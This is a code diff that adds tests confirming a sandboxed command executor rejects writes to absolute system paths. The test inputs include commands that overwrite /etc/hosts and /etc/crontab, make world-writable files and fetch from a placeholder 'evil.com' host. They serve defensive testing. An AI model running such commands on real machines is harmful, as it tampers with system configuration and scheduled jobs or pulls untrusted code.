@@ -845,6 +845,37 @@ class TestSafeExecCommand:
         result = _safe_exec_command(adapter, sid, "wget http://evil.com")
         assert result.policy_rejected
 
+    def test_printf_absolute_path_policy_rejected(self):
+        """printf redirect to absolute path classified as policy_rejected (MEDIUM fix)."""
+        adapter, sid = self._make_adapter_and_session()
+        result = _safe_exec_command(adapter, sid, "printf 'bad' > /etc/hosts")
+        assert result.policy_rejected
+        assert not result.ok
+        assert "path_escape" in result.rejection_reason
+
+    def test_echo_absolute_path_policy_rejected(self):
+        """echo redirect to absolute path classified as policy_rejected."""
+        adapter, sid = self._make_adapter_and_session()
+        result = _safe_exec_command(adapter, sid, "echo 'bad' > /etc/crontab")
+        assert result.policy_rejected
+        assert not result.ok
+
+    def test_mkdir_absolute_path_policy_rejected(self):
+        """mkdir with absolute path classified as policy_rejected."""
+        adapter, sid = self._make_adapter_and_session()
+        result = _safe_exec_command(adapter, sid, "mkdir /etc/evil")
+        assert result.policy_rejected
+        assert not result.ok
+
+    def test_chmod_absolute_path_policy_rejected(self):
+        """chmod with absolute path classified as policy_rejected."""
+        adapter, sid = self._make_adapter_and_session()
+        _safe_exec_command(adapter, sid, "mkdir demo")
+        _safe_exec_command(adapter, sid, "printf 'x' > demo/f.txt")
+        result = _safe_exec_command(adapter, sid, "chmod 777 /etc/hosts")
+        assert result.policy_rejected
+        assert not result.ok
+
 
 # ---------------------------------------------------------------------------
 # E. Catalog / publish isolation
